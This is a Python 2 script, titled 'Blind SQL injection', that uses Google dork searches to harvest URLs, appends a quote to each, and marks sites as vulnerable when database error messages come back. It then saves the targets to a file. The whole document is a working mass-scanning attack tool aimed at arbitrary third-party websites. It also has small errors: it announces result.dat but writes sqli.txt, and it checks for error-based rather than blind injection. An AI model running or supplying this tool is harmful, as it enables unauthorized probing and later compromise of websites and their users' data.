#-------------------------------------------------------------------------------
# Name:        Blind SQL injection
# Purpose:
#
# Author:      darklord
#
# Created:     11/10/2014
# Copyright:   (c) darklord 2014
# Licence:     <your licence>
#-------------------------------------------------------------------------------

#!/usr/bin/python
import urllib2
import sys

#output file ex: result.dat
filename = "result.dat"

# This function gets a site url and returns 1 if its vulnurable. else, 0 will be returned
def isvul ( url ):
    usock = urllib2.urlopen(url)
    data = usock.read()
    usock.close()
    if "You have an error in your SQL" in data:
       return 1;
    elif "supplied argument is not a valid MySQL result resource in" in data:
       return 1;
    elif "Division by zero in" in data:
       return 1;
    elif "Microsoft JET Database" in data:
       return 1;
    elif "Microsoft OLE DB Provider for SQL Server" in data:
       return 1;
    elif "ODBC Microsoft Access Driver" in data:
       return 1;
    elif "Unclosed quotation mark" in data:
       return 1;
    elif "Microsoft OLE DB Provider for Oracle" in data:
       return 1;
    elif "Incorrect syntax near" in data:
       return 1;
    elif "SQL query failed" in data:
       return 1;
    return 0;
# Gets inputs from user
dork = raw_input("Enter dork: ")
ttld = raw_input("Enter tld: ")
lng = raw_input("Language: ")
results = raw_input("Results: ")

file = open("sqli.txt","w")

# Getting matched urls from google
from google import search
for url in search('inurl:' + dork, tld='' + ttld, lang='' + lng, stop=(0 + int(results))):
    url = url + "'"
    print '.',
    if isvul(url) == 1:
       file.write(url)
       file.write("\r\n")
       print 'vulnerable!',

file.close()

print "urls of vulnurable sites saved in 'result.dat'"
